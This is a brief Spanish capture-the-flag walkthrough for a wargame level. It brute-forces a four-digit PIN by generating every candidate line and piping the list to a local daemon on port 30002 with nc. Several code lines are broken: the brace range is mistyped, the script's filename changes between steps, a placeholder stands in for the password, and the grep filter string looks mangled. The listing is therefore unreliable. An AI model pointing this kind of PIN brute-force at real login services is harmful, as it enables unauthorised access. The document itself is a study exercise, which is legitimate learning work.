En este nivel encontramos un "demonio" escuchando en el puerto "30002" que nos dara la pass de "bandit25"

Si proporcionamos la constraseña "bandit24" y una numero secreto de 4-digitos

La única forma de conseguirlo es con fuerza bruta.

```
mktemp -d
touch scrip.sh
chmod +x !$
```
```
#!/bin/bash

for i in {0000..:9999}; do
    echo "pass bandit24 $i"
done
```
Hemos aprendido a hacer una fuerza bruta
```
script.sh > diccionario.txt
```
```
cat diccionario.txt | nc localhost 30002 | grep -v -E "WrongPlease"
```
